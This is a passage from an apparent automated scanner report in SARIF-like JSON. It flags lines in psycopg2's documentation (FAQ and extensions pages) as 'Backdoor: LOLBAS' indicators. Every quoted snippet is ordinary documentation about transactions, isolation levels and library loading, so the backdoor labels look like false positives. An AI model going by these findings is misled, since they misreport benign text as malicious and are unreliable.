                  "endLine": 28,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n    - If you haven't found an answer yet, please write to the `Mailing List`_.\n\n    - If you haven't found a bug, DO NOT write to the bug tracker to ask\n      questions. You will only get piro grumpy.\n\n    .. _mailing list: https://www.postgresql.org/list/psycopg/\n",
                    "rendered": {
                      "text": "\n    - If you haven't found an answer yet, please write to the `Mailing List`_.\n\n    - If you haven't found a bug, DO NOT write to the bug tracker to ask\n      questions. You will only get piro grumpy.\n\n    .. _mailing list: https://www.postgresql.org/list/psycopg/\n",
                      "markdown": "`\n    - If you haven't found an answer yet, please write to the `Mailing List`_.\n\n    - If you haven't found a bug, DO NOT write to the bug tracker to ask\n      questions. You will only get piro grumpy.\n\n    .. _mailing list: https://www.postgresql.org/list/psycopg/\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 376,
                  "startColumn": 40,
                  "endLine": 376,
                  "endColumn": 45,
                  "snippet": {
                    "text": "Psycopg raises *ImportError: cannot import name tz* on import in mod_wsgi / ASP, but it works fine otherwise.\n    If `!psycopg2` is installed in an egg_ (e.g. because installed by\n    :program:`easy_install`), the user running the program may be unable to\n    write in the `eggs cache`__. Set the env variable\n    :envvar:`PYTHON_EGG_CACHE` to a writable directory. With modwsgi you can\n    use the WSGIPythonEggs__ directive.\n\n",
                    "rendered": {
                      "text": "Psycopg raises *ImportError: cannot import name tz* on import in mod_wsgi / ASP, but it works fine otherwise.\n    If `!psycopg2` is installed in an egg_ (e.g. because installed by\n    :program:`easy_install`), the user running the program may be unable to\n    write in the `eggs cache`__. Set the env variable\n    :envvar:`PYTHON_EGG_CACHE` to a writable directory. With modwsgi you can\n    use the WSGIPythonEggs__ directive.\n\n",
                      "markdown": "`Psycopg raises *ImportError: cannot import name tz* on import in mod_wsgi / ASP, but it works fine otherwise.\n    If `!psycopg2` is installed in an egg_ (e.g. because installed by\n    :program:`easy_install`), the user running the program may be unable to\n    write in the `eggs cache`__. Set the env variable\n    :envvar:`PYTHON_EGG_CACHE` to a writable directory. With modwsgi you can\n    use the WSGIPythonEggs__ directive.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 364,
                  "startColumn": 35,
                  "endLine": 364,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n",
                    "rendered": {
                      "text": "    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n",
                      "markdown": "`    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 6,
                  "endLine": 361,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n",
                    "rendered": {
                      "text": "\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n",
                      "markdown": "`\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 359,
                  "startColumn": 54,
                  "endLine": 359,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\n    .. code-block:: shell\n\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n",
                    "rendered": {
                      "text": "\n    .. code-block:: shell\n\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n",
                      "markdown": "`\n    .. code-block:: shell\n\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 49,
                  "endLine": 352,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n",
                    "rendered": {
                      "text": "\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n",
                      "markdown": "`\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 347,
                  "startColumn": 29,
                  "endLine": 347,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n",
                    "rendered": {
                      "text": "\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n",
                      "markdown": "`\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 25,
                  "endLine": 161,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        psycopg2.extensions.register_type(DEC2FLOAT)\n\n    See :ref:`type-casting-from-sql-to-python` to read the relevant\n    documentation. If you find `!psycopg2.extensions.DECIMAL` not available, use\n    `!psycopg2._psycopg.DECIMAL` instead.\n\n\n",
                    "rendered": {
                      "text": "        psycopg2.extensions.register_type(DEC2FLOAT)\n\n    See :ref:`type-casting-from-sql-to-python` to read the relevant\n    documentation. If you find `!psycopg2.extensions.DECIMAL` not available, use\n    `!psycopg2._psycopg.DECIMAL` instead.\n\n\n",
                      "markdown": "`        psycopg2.extensions.register_type(DEC2FLOAT)\n\n    See :ref:`type-casting-from-sql-to-python` to read the relevant\n    documentation. If you find `!psycopg2.extensions.DECIMAL` not available, use\n    `!psycopg2._psycopg.DECIMAL` instead.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 21,
                  "endLine": 50,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n    If you are writing a long-living program, you should probably make sure to\n    call one of the transaction closing methods before leaving the connection\n    unused for a long time (which may also be a few seconds, depending on the\n    concurrency level in your database).  Alternatively you can use a\n    connection in `~connection.autocommit` mode to avoid a new transaction to\n    be started at the first command.\n",
                    "rendered": {
                      "text": "\n    If you are writing a long-living program, you should probably make sure to\n    call one of the transaction closing methods before leaving the connection\n    unused for a long time (which may also be a few seconds, depending on the\n    concurrency level in your database).  Alternatively you can use a\n    connection in `~connection.autocommit` mode to avoid a new transaction to\n    be started at the first command.\n",
                      "markdown": "`\n    If you are writing a long-living program, you should probably make sure to\n    call one of the transaction closing methods before leaving the connection\n    unused for a long time (which may also be a few seconds, depending on the\n    concurrency level in your database).  Alternatively you can use a\n    connection in `~connection.autocommit` mode to avoid a new transaction to\n    be started at the first command.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 55,
                  "endLine": 43,
                  "endColumn": 61,
                  "snippet": {
                    "text": ".. cssclass:: faq\n\nWhy does `!psycopg2` leave database sessions \"idle in transaction\"?\n    Psycopg normally starts a new transaction the first time a query is\n    executed, e.g. calling `cursor.execute()`, even if the command is a\n    :sql:`SELECT`.  The transaction is not closed until an explicit\n    `~connection.commit()` or `~connection.rollback()`.\n",
                    "rendered": {
                      "text": ".. cssclass:: faq\n\nWhy does `!psycopg2` leave database sessions \"idle in transaction\"?\n    Psycopg normally starts a new transaction the first time a query is\n    executed, e.g. calling `cursor.execute()`, even if the command is a\n    :sql:`SELECT`.  The transaction is not closed until an explicit\n    `~connection.commit()` or `~connection.rollback()`.\n",
                      "markdown": "`.. cssclass:: faq\n\nWhy does `!psycopg2` leave database sessions \"idle in transaction\"?\n    Psycopg normally starts a new transaction the first time a query is\n    executed, e.g. calling `cursor.execute()`, even if the command is a\n    :sql:`SELECT`.  The transaction is not closed until an explicit\n    `~connection.commit()` or `~connection.rollback()`.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 815,
                  "startColumn": 32,
                  "endLine": 815,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n.. data:: ISOLATION_LEVEL_DEFAULT\n\n    A new transaction is started at the first `~cursor.execute()` command, but\n    the isolation level is not explicitly selected by Psycopg: the server will\n    use whatever level is defined in its configuration or by statements\n    executed within the session outside Pyscopg control.  If you want to know\n",
                    "rendered": {
                      "text": "\n.. data:: ISOLATION_LEVEL_DEFAULT\n\n    A new transaction is started at the first `~cursor.execute()` command, but\n    the isolation level is not explicitly selected by Psycopg: the server will\n    use whatever level is defined in its configuration or by statements\n    executed within the session outside Pyscopg control.  If you want to know\n",
                      "markdown": "`\n.. data:: ISOLATION_LEVEL_DEFAULT\n\n    A new transaction is started at the first `~cursor.execute()` command, but\n    the isolation level is not explicitly selected by Psycopg: the server will\n    use whatever level is defined in its configuration or by statements\n    executed within the session outside Pyscopg control.  If you want to know\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 805,
                  "startColumn": 65,
                  "endLine": 805,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n    Starting from PostgreSQL 9.1, this mode monitors for conditions which\n    could make execution of a concurrent set of serializable transactions\n    behave in a manner inconsistent with all possible serial (one at a time)\n    executions of those transaction. In previous version the behaviour was the\n    same of the :sql:`REPEATABLE READ` isolation level.\n\n",
                    "rendered": {
                      "text": "\n    Starting from PostgreSQL 9.1, this mode monitors for conditions which\n    could make execution of a concurrent set of serializable transactions\n    behave in a manner inconsistent with all possible serial (one at a time)\n    executions of those transaction. In previous version the behaviour was the\n    same of the :sql:`REPEATABLE READ` isolation level.\n\n",
                      "markdown": "`\n    Starting from PostgreSQL 9.1, this mode monitors for conditions which\n    could make execution of a concurrent set of serializable transactions\n    behave in a manner inconsistent with all possible serial (one at a time)\n    executions of those transaction. In previous version the behaviour was the\n    same of the :sql:`REPEATABLE READ` isolation level.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 60,
                  "endLine": 797,
                  "endColumn": 64,
                  "snippet": {
                    "text": ".. data:: ISOLATION_LEVEL_SERIALIZABLE\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`SERIALIZABLE` isolation level. This is the strictest transactions\n    isolation level, equivalent to having the transactions executed serially\n    rather than concurrently. However applications using this level must be\n",
                    "rendered": {
                      "text": ".. data:: ISOLATION_LEVEL_SERIALIZABLE\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`SERIALIZABLE` isolation level. This is the strictest transactions\n    isolation level, equivalent to having the transactions executed serially\n    rather than concurrently. However applications using this level must be\n",
                      "markdown": "`.. data:: ISOLATION_LEVEL_SERIALIZABLE\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`SERIALIZABLE` isolation level. This is the strictest transactions\n    isolation level, equivalent to having the transactions executed serially\n    rather than concurrently. However applications using this level must be\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 796,
                  "startColumn": 73,
                  "endLine": 797,
                  "snippet": {
                    "text": "\n.. data:: ISOLATION_LEVEL_SERIALIZABLE\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`SERIALIZABLE` isolation level. This is the strictest transactions\n    isolation level, equivalent to having the transactions executed serially\n    rather than concurrently. However applications using this level must be\n",
                    "rendered": {
                      "text": "\n.. data:: ISOLATION_LEVEL_SERIALIZABLE\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`SERIALIZABLE` isolation level. This is the strictest transactions\n    isolation level, equivalent to having the transactions executed serially\n    rather than concurrently. However applications using this level must be\n",
                      "markdown": "`\n.. data:: ISOLATION_LEVEL_SERIALIZABLE\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`SERIALIZABLE` isolation level. This is the strictest transactions\n    isolation level, equivalent to having the transactions executed serially\n    rather than concurrently. However applications using this level must be\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 782,
                  "startColumn": 46,
                  "endLine": 782,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n    While this level provides a guarantee that each transaction sees a\n    completely stable view of the database, this view will not necessarily\n    always be consistent with some serial (one at a time) execution of\n    concurrent transactions of the same level.\n\n    .. versionchanged:: 2.4.2\n",
                    "rendered": {
                      "text": "\n    While this level provides a guarantee that each transaction sees a\n    completely stable view of the database, this view will not necessarily\n    always be consistent with some serial (one at a time) execution of\n    concurrent transactions of the same level.\n\n    .. versionchanged:: 2.4.2\n",
                      "markdown": "`\n    While this level provides a guarantee that each transaction sees a\n    completely stable view of the database, this view will not necessarily\n    always be consistent with some serial (one at a time) execution of\n    concurrent transactions of the same level.\n\n    .. versionchanged:: 2.4.2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 773,
                  "startColumn": 60,
                  "endLine": 773,
                  "endColumn": 64,
                  "snippet": {
                    "text": ".. data:: ISOLATION_LEVEL_REPEATABLE_READ\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`REPEATABLE READ` isolation level: all the queries in a transaction\n    see a snapshot as of the start of the transaction, not as of the start of\n    the current query within the transaction.  However applications using this\n",
                    "rendered": {
                      "text": ".. data:: ISOLATION_LEVEL_REPEATABLE_READ\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`REPEATABLE READ` isolation level: all the queries in a transaction\n    see a snapshot as of the start of the transaction, not as of the start of\n    the current query within the transaction.  However applications using this\n",
                      "markdown": "`.. data:: ISOLATION_LEVEL_REPEATABLE_READ\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`REPEATABLE READ` isolation level: all the queries in a transaction\n    see a snapshot as of the start of the transaction, not as of the start of\n    the current query within the transaction.  However applications using this\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 73,
                  "endLine": 773,
                  "snippet": {
                    "text": "\n.. data:: ISOLATION_LEVEL_REPEATABLE_READ\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`REPEATABLE READ` isolation level: all the queries in a transaction\n    see a snapshot as of the start of the transaction, not as of the start of\n    the current query within the transaction.  However applications using this\n",
                    "rendered": {
                      "text": "\n.. data:: ISOLATION_LEVEL_REPEATABLE_READ\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`REPEATABLE READ` isolation level: all the queries in a transaction\n    see a snapshot as of the start of the transaction, not as of the start of\n    the current query within the transaction.  However applications using this\n",
                      "markdown": "`\n.. data:: ISOLATION_LEVEL_REPEATABLE_READ\n\n    As in `!ISOLATION_LEVEL_READ_COMMITTED`, a new transaction is started at\n    the first `~cursor.execute()` command.  Transactions run at a\n    :sql:`REPEATABLE READ` isolation level: all the queries in a transaction\n    see a snapshot as of the start of the transaction, not as of the start of\n    the current query within the transaction.  However applications using this\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 758,
                  "startColumn": 14,
                  "endLine": 758,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    be set in the database configuration.\n\n    A new transaction is started at the first `~cursor.execute()` command on a\n    cursor and at each new `!execute()` after a `~connection.commit()` or a\n    `~connection.rollback()`.  The transaction runs in the PostgreSQL\n    :sql:`READ COMMITTED` isolation level: a :sql:`SELECT` query sees only\n    data committed before the query began; it never sees either uncommitted\n",
                    "rendered": {
                      "text": "    be set in the database configuration.\n\n    A new transaction is started at the first `~cursor.execute()` command on a\n    cursor and at each new `!execute()` after a `~connection.commit()` or a\n    `~connection.rollback()`.  The transaction runs in the PostgreSQL\n    :sql:`READ COMMITTED` isolation level: a :sql:`SELECT` query sees only\n    data committed before the query began; it never sees either uncommitted\n",
                      "markdown": "`    be set in the database configuration.\n\n    A new transaction is started at the first `~cursor.execute()` command on a\n    cursor and at each new `!execute()` after a `~connection.commit()` or a\n    `~connection.rollback()`.  The transaction runs in the PostgreSQL\n    :sql:`READ COMMITTED` isolation level: a :sql:`SELECT` query sees only\n    data committed before the query began; it never sees either uncommitted\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 757,
                  "startColumn": 32,
                  "endLine": 757,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    This is usually the default PostgreSQL value, but a different default may\n    be set in the database configuration.\n\n    A new transaction is started at the first `~cursor.execute()` command on a\n    cursor and at each new `!execute()` after a `~connection.commit()` or a\n    `~connection.rollback()`.  The transaction runs in the PostgreSQL\n    :sql:`READ COMMITTED` isolation level: a :sql:`SELECT` query sees only\n",
                    "rendered": {
                      "text": "    This is usually the default PostgreSQL value, but a different default may\n    be set in the database configuration.\n\n    A new transaction is started at the first `~cursor.execute()` command on a\n    cursor and at each new `!execute()` after a `~connection.commit()` or a\n    `~connection.rollback()`.  The transaction runs in the PostgreSQL\n    :sql:`READ COMMITTED` isolation level: a :sql:`SELECT` query sees only\n",
                      "markdown": "`    This is usually the default PostgreSQL value, but a different default may\n    be set in the database configuration.\n\n    A new transaction is started at the first `~cursor.execute()` command on a\n    cursor and at each new `!execute()` after a `~connection.commit()` or a\n    `~connection.rollback()`.  The transaction runs in the PostgreSQL\n    :sql:`READ COMMITTED` isolation level: a :sql:`SELECT` query sees only\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 698,
                  "startColumn": 44,
                  "endLine": 698,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    :param algorithm: the password encryption algorithm to use\n\n    The *algorithm* ``md5`` is always supported. Other algorithms are only\n    supported if the client libpq version is at least 10 and may require a\n    compatible server version: check the `PostgreSQL encryption\n    documentation`__ to know the algorithms supported by your server.\n\n",
                    "rendered": {
                      "text": "    :param algorithm: the password encryption algorithm to use\n\n    The *algorithm* ``md5`` is always supported. Other algorithms are only\n    supported if the client libpq version is at least 10 and may require a\n    compatible server version: check the `PostgreSQL encryption\n    documentation`__ to know the algorithms supported by your server.\n\n",
                      "markdown": "`    :param algorithm: the password encryption algorithm to use\n\n    The *algorithm* ``md5`` is always supported. Other algorithms are only\n    supported if the client libpq version is at least 10 and may require a\n    compatible server version: check the `PostgreSQL encryption\n    documentation`__ to know the algorithms supported by your server.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 233,
                  "startColumn": 16,
                  "endLine": 233,
                  "endColumn": 20,
                  "snippet": {
